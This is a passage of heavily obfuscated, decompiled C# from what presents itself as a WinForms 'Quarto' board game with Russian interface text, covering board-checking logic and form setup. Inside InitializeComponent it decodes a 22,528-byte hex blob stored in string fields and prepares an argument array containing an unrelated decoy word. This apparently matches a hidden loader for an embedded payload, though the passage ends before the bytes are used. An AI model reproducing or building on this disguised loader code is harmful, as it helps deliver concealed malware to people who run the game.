				case 57u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -1423228053) ^ 0x467245FB;
						continue;
					}
					goto IL_0412;
				case 56u:
				{
					int num21;
					int num22;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num21 = 1985388051;
						num22 = 1985388051;
					}
					else
					{
						num21 = 1799371580;
						num22 = 1799371580;
					}
					num = num21 ^ ((int)num2 * -1229208641);
					continue;
				}
				case 55u:
				{
					int num9;
					int num10;
					if (mem[0, 0] == null)
					{
						num9 = -804454944;
						num10 = -804454944;
					}
					else
					{
						num9 = -1982244964;
						num10 = -1982244964;
					}
					num = num9 ^ (int)(num2 * 1958142414);
					continue;
				}
				case 54u:
					flag2 = true;
					num = (int)(num2 * 1382081643) ^ -1367256813;
					continue;
				case 53u:
				{
					int num73;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = -1616959430;
						num73 = -1616959430;
					}
					else
					{
						num = -851362473;
						num73 = -851362473;
					}
					continue;
				}
				case 52u:
					if (mem[num8, 2].Square != mem[num8, 3].Square)
					{
						num = (int)(num2 * 830600251) ^ -1079004959;
						continue;
					}
					goto IL_0504;
				case 51u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -28474273) ^ 0x66BFA217;
						continue;
					}
					goto IL_0097;
				case 50u:
				{
					int num62;
					int num63;
					if (mem[num8, 1].Dark != mem[num8, 2].Dark)
					{
						num62 = 290478936;
						num63 = 290478936;
					}
					else
					{
						num62 = 700128190;
						num63 = 700128190;
					}
					num = num62 ^ (int)(num2 * 567616967);
					continue;
				}
				case 49u:
				{
					int num56;
					int num57;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num56 = 1733872570;
						num57 = 1733872570;
					}
					else
					{
						num56 = 1294285843;
						num57 = 1294285843;
					}
					num = num56 ^ ((int)num2 * -1726782559);
					continue;
				}
				case 48u:
					num31 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0077;
				case 47u:
					if (mem[2, num8].Dark != mem[3, num8].Dark)
					{
						num = ((int)num2 * -1889711354) ^ -1507335856;
						continue;
					}
					goto IL_05fc;
				case 46u:
					if (mem[3, 0] != null)
					{
						num = (int)(num2 * 1323441783) ^ -1141796127;
						continue;
					}
					goto IL_0097;
				case 45u:
				{
					int num42;
					int num43;
					if (mem[num8, 1].Big == mem[num8, 2].Big)
					{
						num42 = 355504354;
						num43 = 355504354;
					}
					else
					{
						num42 = 757500855;
						num43 = 757500855;
					}
					num = num42 ^ ((int)num2 * -759755450);
					continue;
				}
				case 44u:
				{
					int num37;
					if (mem[0, num8].Dark != mem[1, num8].Dark)
					{
						num = -409848914;
						num37 = -409848914;
					}
					else
					{
						num = -1151589837;
						num37 = -1151589837;
					}
					continue;
				}
				case 43u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -796385440) ^ 0x53E454DB;
						continue;
					}
					goto IL_0097;
				case 42u:
				{
					int num29;
					int num30;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num29 = -535525363;
						num30 = -535525363;
					}
					else
					{
						num29 = -500554721;
						num30 = -500554721;
					}
					num = num29 ^ ((int)num2 * -243641995);
					continue;
				}
				case 41u:
				{
					int num28;
					if (mem[num8, 0].Point != mem[num8, 1].Point)
					{
						num = -1324973617;
						num28 = -1324973617;
					}
					else
					{
						num = -598137038;
						num28 = -598137038;
					}
					continue;
				}
				case 40u:
				{
					int num17;
					int num18;
					if (flag3)
					{
						num17 = 834463381;
						num18 = 834463381;
					}
					else
					{
						num17 = 1401207555;
						num18 = 1401207555;
					}
					num = num17 ^ (int)(num2 * 2098877710);
					continue;
				}
				case 39u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 1406326938) ^ -1618489913;
						continue;
					}
					goto IL_0076;
				case 38u:
					if (mem[2, num8].Big != mem[3, num8].Big)
					{
						num = (int)(num2 * 1621605569) ^ -251937161;
						continue;
					}
					goto IL_05fc;
				case 37u:
					flag2 = true;
					num = (int)(num2 * 885633197) ^ -1113744438;
					continue;
				case 36u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -343242007;
						continue;
					}
					goto IL_03dd;
				case 35u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -85551139;
						num6 = -85551139;
					}
					else
					{
						num5 = -959712258;
						num6 = -959712258;
					}
					num = num5 ^ (int)(num2 * 576979174);
					continue;
				}
				case 34u:
				{
					int num71;
					int num72;
					if (mem[num8, 2] != null)
					{
						num71 = 241310856;
						num72 = 241310856;
					}
					else
					{
						num71 = 1297370843;
						num72 = 1297370843;
					}
					num = num71 ^ ((int)num2 * -1849133658);
					continue;
				}
				case 33u:
					if (mem[3, num8] != null)
					{
						num = (int)((num2 * 1562195604) ^ 0x75ED867);
						continue;
					}
					goto IL_01b9;
				case 32u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -674680592) ^ -2655046;
						continue;
					}
					goto IL_0412;
				case 31u:
					flag4 = num8 < 4;
					num = -428987745;
					continue;
				case 30u:
				{
					int num70;
					if (mem[num8, 0].Dark != mem[num8, 1].Dark)
					{
						num = -1832575590;
						num70 = -1832575590;
					}
					else
					{
						num = -1773662205;
						num70 = -1773662205;
					}
					continue;
				}
				case 29u:
				{
					int num64;
					int num65;
					if (mem[num8, 1].Point != mem[num8, 2].Point)
					{
						num64 = 749544800;
						num65 = 749544800;
					}
					else
					{
						num64 = 1937738060;
						num65 = 1937738060;
					}
					num = num64 ^ ((int)num2 * -2032601743);
					continue;
				}
				case 28u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 1070406980) ^ -436642962;
						continue;
					}
					goto IL_0076;
				case 27u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -216280684) ^ -827993678;
						continue;
					}
					goto IL_0412;
				case 26u:
					if (mem[num8, 2].Point != mem[num8, 3].Point)
					{
						num = ((int)num2 * -1111642956) ^ 0x41FF3117;
						continue;
					}
					goto IL_0504;
				case 25u:
				{
					int num55;
					if (mem[0, num8].Point == mem[1, num8].Point)
					{
						num = -1614561376;
						num55 = -1614561376;
					}
					else
					{
						num = -951936892;
						num55 = -951936892;
					}
					continue;
				}
				case 24u:
				{
					int num53;
					int num54;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num53 = -1803068442;
						num54 = -1803068442;
					}
					else
					{
						num53 = -1450480451;
						num54 = -1450480451;
					}
					num = num53 ^ ((int)num2 * -1530813974);
					continue;
				}
				case 23u:
					num = ((int)num2 * -907837038) ^ 0xF166EFC;
					continue;
				case 21u:
					if (mem[0, num8].Square == mem[1, num8].Square)
					{
						num = -34970877;
						continue;
					}
					goto IL_0190;
				case 20u:
				{
					int num48;
					int num49;
					if (mem[num8, 1] != null)
					{
						num48 = -1476069043;
						num49 = -1476069043;
					}
					else
					{
						num48 = -55894713;
						num49 = -55894713;
					}
					num = num48 ^ ((int)num2 * -2060699458);
					continue;
				}
				case 19u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)((num2 * 2113675300) ^ 0x316BBC53);
						continue;
					}
					goto IL_0412;
				case 18u:
					result = flag2;
					num = -160984783;
					continue;
				case 17u:
					if (mem[1, num8] != null)
					{
						num = (int)((num2 * 1037766107) ^ 0x2A053301);
						continue;
					}
					goto IL_01b9;
				case 16u:
				{
					int num38;
					int num39;
					if (mem[0, num8].Big == mem[1, num8].Big)
					{
						num38 = 1027156264;
						num39 = 1027156264;
					}
					else
					{
						num38 = 372489955;
						num39 = 372489955;
					}
					num = num38 ^ ((int)num2 * -1015341618);
					continue;
				}
				case 15u:
				{
					int num35;
					int num36;
					if (mem[1, num8].Point == mem[2, num8].Point)
					{
						num35 = 645942129;
						num36 = 645942129;
					}
					else
					{
						num35 = 1686888528;
						num36 = 1686888528;
					}
					num = num35 ^ (int)(num2 * 499493156);
					continue;
				}
				case 14u:
				{
					int num32;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = -1113670449;
						num32 = -1113670449;
					}
					else
					{
						num = -499957762;
						num32 = -499957762;
					}
					continue;
				}
				case 13u:
					if (mem[num8, 2].Dark != mem[num8, 3].Dark)
					{
						num = ((int)num2 * -1212723574) ^ -1677449168;
						continue;
					}
					goto IL_0504;
				case 12u:
					num = -210120291;
					continue;
				case 11u:
					if (mem[num8, 2].Big != mem[num8, 3].Big)
					{
						num = (int)((num2 * 1316630579) ^ 0x58E9851A);
						continue;
					}
					goto IL_0504;
				case 10u:
				{
					int num25;
					int num26;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num25 = -1709665809;
						num26 = -1709665809;
					}
					else
					{
						num25 = -1626611785;
						num26 = -1626611785;
					}
					num = num25 ^ (int)(num2 * 35268970);
					continue;
				}
				case 9u:
				{
					int num19;
					int num20;
					if (mem[num8, 0] != null)
					{
						num19 = 401729537;
						num20 = 401729537;
					}
					else
					{
						num19 = 427571953;
						num20 = 427571953;
					}
					num = num19 ^ ((int)num2 * -851934342);
					continue;
				}
				case 8u:
					if (mem[0, num8] != null)
					{
						num = -515087880;
						continue;
					}
					goto IL_01b9;
				case 7u:
					flag2 = false;
					num8 = 0;
					num = ((int)num2 * -871496622) ^ 0x96BDDC4;
					continue;
				case 6u:
					num7 = ((mem[2, num8].Square == mem[3, num8].Square) ? 1 : 0);
					goto IL_0191;
				case 5u:
				{
					int num14;
					int num15;
					if (mem[num8, 0].Big == mem[num8, 1].Big)
					{
						num14 = 1693363740;
						num15 = 1693363740;
					}
					else
					{
						num14 = 1920818201;
						num15 = 1920818201;
					}
					num = num14 ^ (int)(num2 * 537903480);
					continue;
				}
				case 4u:
				{
					int num13;
					if (mem[num8, 0].Square == mem[num8, 1].Square)
					{
						num = -1453074370;
						num13 = -1453074370;
					}
					else
					{
						num = -1848065405;
						num13 = -1848065405;
					}
					continue;
				}
				case 3u:
				{
					int num11;
					int num12;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num11 = -1355404478;
						num12 = -1355404478;
					}
					else
					{
						num11 = -22922723;
						num12 = -22922723;
					}
					num = num11 ^ ((int)num2 * -404844181);
					continue;
				}
				case 2u:
					if (mem[2, num8].Point != mem[3, num8].Point)
					{
						num = ((int)num2 * -1252494851) ^ -1488781588;
						continue;
					}
					goto IL_05fc;
				case 1u:
					num = -1923281664;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (mem[2, 2] == null)
					{
						num3 = -1896374106;
						num4 = -1896374106;
					}
					else
					{
						num3 = -413222080;
						num4 = -413222080;
					}
					num = num3 ^ (int)(num2 * 377465125);
					continue;
				}
				case 59u:
					break;
				default:
					{
						return result;
					}
					IL_0504:
					num7 = 1;
					goto IL_0191;
					IL_0190:
					num7 = 0;
					goto IL_0191;
					IL_0191:
					flag = (byte)num7 != 0;
					num = -1253697528;
					continue;
					IL_0412:
					num31 = 1;
					goto IL_0077;
					IL_0097:
					num31 = 0;
					goto IL_0077;
					IL_03dd:
					num31 = 0;
					goto IL_0077;
					IL_05fc:
					num7 = 1;
					goto IL_0191;
					IL_0076:
					num31 = 1;
					goto IL_0077;
					IL_0077:
					flag3 = (byte)num31 != 0;
					num = -723967309;
					continue;
					IL_01b9:
					num7 = 0;
					goto IL_0191;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		int num4 = default(int);
		bool result = default(bool);
		while (true)
		{
			int num = 2026965528;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x61D65995u) % 15u)
				{
				case 14u:
					num3++;
					num = ((int)num2 * -1024756564) ^ -791676259;
					continue;
				case 13u:
					flag = false;
					num = (int)((num2 * 858880529) ^ 0x1E147E9A);
					continue;
				case 12u:
					num = ((int)num2 * -420808603) ^ -311193822;
					continue;
				case 10u:
				{
					int num6;
					if (num3 >= 4)
					{
						num = 1429952567;
						num6 = 1429952567;
					}
					else
					{
						num = 2098148783;
						num6 = 2098148783;
					}
					continue;
				}
				case 9u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = 1100901628;
						num8 = 1100901628;
					}
					else
					{
						num7 = 1445441012;
						num8 = 1445441012;
					}
					num = num7 ^ (int)(num2 * 234236677);
					continue;
				}
				case 8u:
				{
					int num5;
					if (mem[num3, num4] == null)
					{
						num = 1345855599;
						num5 = 1345855599;
					}
					else
					{
						num = 63259392;
						num5 = 63259392;
					}
					continue;
				}
				case 7u:
					num4++;
					num = 1521919481;
					continue;
				case 6u:
					num4 = 0;
					num = 1297337400;
					continue;
				case 5u:
					flag2 = num4 < 4;
					num = 2050955381;
					continue;
				case 4u:
					num = ((int)num2 * -1033237004) ^ 0x1138D41D;
					continue;
				case 3u:
					num = (int)((num2 * 1048326658) ^ 0x1ACC1F2A);
					continue;
				case 2u:
					result = flag;
					num = (int)((num2 * 1772658550) ^ 0x4BBDFA40);
					continue;
				case 1u:
					flag = true;
					num3 = 0;
					num = ((int)num2 * -1886564823) ^ 0x2D91437;
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = 570312933;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6539ADA2u) % 8u)
				{
				case 7u:
					Form1.smethod_32((Control)(object)label6, str);
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)((num2 * 429497118) ^ 0x45189999);
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -633207334) ^ 0x137B7493;
					continue;
				case 5u:
					num = (int)((num2 * 11551644) ^ 0x14CE5664);
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)(num2 * 941045611) ^ -1580650232;
					continue;
				case 3u:
					num = (int)(num2 * 1336923697) ^ -633987307;
					continue;
				case 1u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)(num2 * 1655502393) ^ -1428639776;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		while (true)
		{
			int num = 1372351785;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0x529DC9D4u) % 10u)
				{
				case 9u:
					num = ((int)num2 * -2033760423) ^ 0x381776CB;
					continue;
				case 7u:
					num = ((int)num2 * -391193044) ^ 0x4A38829;
					continue;
				case 6u:
					num = (int)(num2 * 300304743) ^ -1083559732;
					continue;
				case 5u:
					((Form)this).Dispose(disposing);
					num = 1074249181;
					continue;
				case 4u:
					num = (int)(num2 * 1582912038) ^ -820060175;
					continue;
				case 2u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -483147878) ^ 0x606628B5;
					continue;
				case 1u:
					if (disposing)
					{
						num = ((int)num2 * -391500219) ^ 0x74053341;
						continue;
					}
					goto IL_008e;
				case 0u:
					if (components != null)
					{
						num = 801183956;
						num3 = 801183956;
						continue;
					}
					goto IL_008e;
				default:
					return;
				case 8u:
					break;
				case 3u:
					return;
					IL_008e:
					num = 706191221;
					num3 = 706191221;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0b90: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9a: Expected O, but got Unknown
		int num3 = default(int);
		byte[] array = default(byte[]);
		string string_ = default(string);
		object[] object_ = default(object[]);
		while (true)
		{
			int num = -1891119797;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA1E85832u) % 128u)
				{
				case 127u:
					num = ((int)num2 * -1028222902) ^ -1632236820;
					continue;
				case 126u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -384379797) ^ -218203566;
					continue;
				case 125u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -138636166) ^ -1645741719;
					continue;
				case 124u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -229686173) ^ 0x79F07A3C;
					continue;
				case 123u:
					num = (int)(num2 * 1986476973) ^ -1909237835;
					continue;
				case 122u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 800765490) ^ 0x786C2342);
					continue;
				case 121u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -2027824412) ^ -1338843992;
					continue;
				case 120u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)(num2 * 1577512677) ^ -411766845;
					continue;
				case 119u:
					num3 = 0;
					num = ((int)num2 * -391487151) ^ 0x13711EFF;
					continue;
				case 118u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 1135183541) ^ 0x385EE449);
					continue;
				case 117u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -886622783) ^ -1929966523;
					continue;
				case 116u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -654056899) ^ 0x2C456065;
					continue;
				case 115u:
					num = ((int)num2 * -1601785155) ^ 0x2C08BA0F;
					continue;
				case 114u:
					Form1.smethod_92((Control)(object)this);
					num = (int)(num2 * 2090453822) ^ -37816006;
					continue;
				case 113u:
					num = ((int)num2 * -687402527) ^ -2003542057;
					continue;
				case 112u:
					num = (int)(num2 * 1422069589) ^ -85959884;
					continue;
				case 111u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -1404734072) ^ -1547144242;
					continue;
				case 110u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = ((int)num2 * -1101702464) ^ -97713393;
					continue;
				case 109u:
					num = ((int)num2 * -448406092) ^ 0x33E3306B;
					continue;
				case 108u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					Form1.smethod_64((Control)(object)label2, 9);
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -1429642745) ^ -1591142344;
					continue;
				case 107u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					num = (int)(num2 * 1617191330) ^ -1770625403;
					continue;
				case 106u:
					num = ((int)num2 * -1384803390) ^ 0x735DF05E;
					continue;
				case 105u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -1304120217) ^ 0x4AB2EDA5;
					continue;
				case 104u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1259741590) ^ -1316505571;
					continue;
				case 103u:
					num = (int)(num2 * 123040592) ^ -638663900;
					continue;
				case 102u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)((num2 * 1611426935) ^ 0x247F24EB);
					continue;
				case 101u:
					num = (int)((num2 * 832816059) ^ 0x352E1A01);
					continue;
				case 100u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)(num2 * 1452255298) ^ -1333837183;
					continue;
				case 99u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)(num2 * 1557977355) ^ -940279752;
					continue;
				case 98u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -211503671) ^ 0x6C78DCEA;
					continue;
				case 97u:
					Form1.smethod_64((Control)(object)panel1, 7);
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -60677995) ^ 0x7A620E94;
					continue;
				case 96u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -1372748081) ^ -1621615732;
					continue;
				case 95u:
					num = (int)((num2 * 3247661) ^ 0x7AE72A63);
					continue;
				case 94u:
					button2 = Form1.smethod_53();
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1845617207) ^ -1737320085;
					continue;
				case 93u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -2056652105) ^ -683174802;
					continue;
				case 92u:
					num = (int)(num2 * 353103302) ^ -1912495448;
					continue;
				case 91u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -411567062) ^ 0x22E9C994;
					continue;
				case 90u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -1880566642) ^ -2146466050;
					continue;
				case 88u:
					num = ((int)num2 * -1370762855) ^ -1299380479;
					continue;
				case 87u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -1194247405) ^ 0x4D09EA13;
					continue;
				case 86u:
					Form1.smethod_61((Control)(object)label5, "label5");
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -2085039035) ^ -1965575592;
					continue;
				case 85u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)(num2 * 1960919996) ^ -1734336584;
					continue;
				case 84u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 472008576) ^ 0x31445671);
					continue;
				case 83u:
					num = (int)((num2 * 1280657928) ^ 0x77238A13);
					continue;
				case 82u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -359158258) ^ 0x42C96E7F;
					continue;
				case 81u:
					num3++;
					num = ((int)num2 * -380193307) ^ 0x7D5BD1FF;
					continue;
				case 80u:
					num = (int)((num2 * 1866544164) ^ 0x79EAA649);
					continue;
				case 79u:
					num = (int)(num2 * 1839678368) ^ -1547879729;
					continue;
				case 78u:
					num = ((int)num2 * -52367537) ^ 0x27F42E76;
					continue;
				case 77u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)(num2 * 214821592) ^ -979938635;
					continue;
				case 76u:
					num = ((int)num2 * -1249807973) ^ -269972636;
					continue;
				case 75u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -739526393) ^ 0x408DE837;
					continue;
				case 74u:
					num = ((int)num2 * -1343431547) ^ 0x67D63842;
					continue;
				case 73u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -1019323878) ^ 0x389B0B75;
					continue;
				case 72u:
					num = (int)(num2 * 607558769) ^ -245348675;
					continue;
				case 71u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -623097534) ^ -321097655;
					continue;
				case 70u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -337572950) ^ 0x125721A9;
					continue;
				case 69u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -34663651) ^ -765272464;
					continue;
				case 68u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1326083861) ^ 0x5F50A882;
					continue;
				case 67u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -106627428) ^ 0xF5CB436;
					continue;
				case 66u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)(num2 * 831593378) ^ -327183148;
					continue;
				case 65u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -816250998) ^ 0x7EB7433D;
					continue;
				case 64u:
					num = (int)((num2 * 1458468296) ^ 0x25F0795B);
					continue;
				case 63u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -1914980768) ^ 0x545D560;
					continue;
				case 62u:
					string_ = Veet.Sa;
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)((num2 * 689167283) ^ 0x361F4267);
					continue;
				case 61u:
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -985466130) ^ 0x3FA7CAEB;
					continue;
				case 60u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -1917699945) ^ 0x40261C3A;
					continue;
				case 59u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1798759052) ^ -1015048824;
					continue;
				case 58u:
					num = (int)((num2 * 1715900764) ^ 0x182EAE4B);
					continue;
				case 57u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)((num2 * 674517007) ^ 0x4BC0FD1D);
					continue;
				case 56u:
				{
					int num4;
					if (num3 >= 22528)
					{
						num = -1955443403;
						num4 = -1955443403;
					}
					else
					{
						num = -2115072635;
						num4 = -2115072635;
					}
					continue;
				}
				case 55u:
					num = -1645293325;
					continue;
				case 54u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 162979418) ^ 0x7A4F113F);
					continue;
				case 53u:
					num = (int)((num2 * 1644733736) ^ 0x1D65BE8);
					continue;
				case 52u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -788934217) ^ -561141840;
					continue;
				case 51u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)(num2 * 1393591769) ^ -1959516397;
					continue;
				case 50u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)(num2 * 1405998406) ^ -1103214655;
					continue;
				case 49u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)((num2 * 126397592) ^ 0x51FE00CA);
					continue;
				case 47u:
					num = ((int)num2 * -1127833625) ^ -1311472040;
					continue;
				case 46u:
					num = ((int)num2 * -2108826496) ^ -1392085331;
					continue;
				case 45u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1508132320) ^ 0x2A7C6BDF;
					continue;
				case 44u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)((num2 * 895794121) ^ 0x50958FAE);
					continue;
				case 43u:
					Form1.smethod_61((Control)(object)label1, "label1");
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -906421981) ^ -2067961296;
					continue;
				case 42u:
					num = (int)(num2 * 146220626) ^ -1570454912;
					continue;
				case 41u:
					num = (int)(num2 * 205094817) ^ -1331810017;
					continue;
				case 40u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 1812166788) ^ -624562792;
					continue;
				case 39u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)((num2 * 639392049) ^ 0x1477C905);
					continue;
				case 38u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1496104249) ^ 0x3FE65697;
					continue;
				case 37u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1334097293) ^ -1910405085;
					continue;
				case 36u:
					num = (int)((num2 * 1467207665) ^ 0x3B8BB84D);
					continue;
				case 35u:
					num = (int)(num2 * 1847218995) ^ -917434864;
					continue;
				case 34u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 600273691) ^ -158509655;
					continue;
				case 33u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -2055003662) ^ -497491115;
					continue;
				case 32u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -1526858364) ^ 0x2748B5AE;
					continue;
				case 31u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -1071935951) ^ 0x1ECC0144;
					continue;
				case 30u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1212924825) ^ 0x5BC084D;
					continue;
				case 29u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -2075396415) ^ -1037657233;
					continue;
				case 28u:
					num = (int)((num2 * 1859451169) ^ 0x126D4BBF);
					continue;
				case 27u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)((num2 * 837356494) ^ 0x30F89255);
					continue;
				case 26u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)(num2 * 636185914) ^ -1665693789;
					continue;
				case 25u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -895326334) ^ -1514726075;
					continue;
				case 24u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)(num2 * 693344082) ^ -383699622;
					continue;
				case 23u:
					richTextBox1 = Form1.smethod_54();
					num = (int)(num2 * 1404387366) ^ -794756685;
					continue;
				case 22u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -1592768171) ^ -1967394874;
					continue;
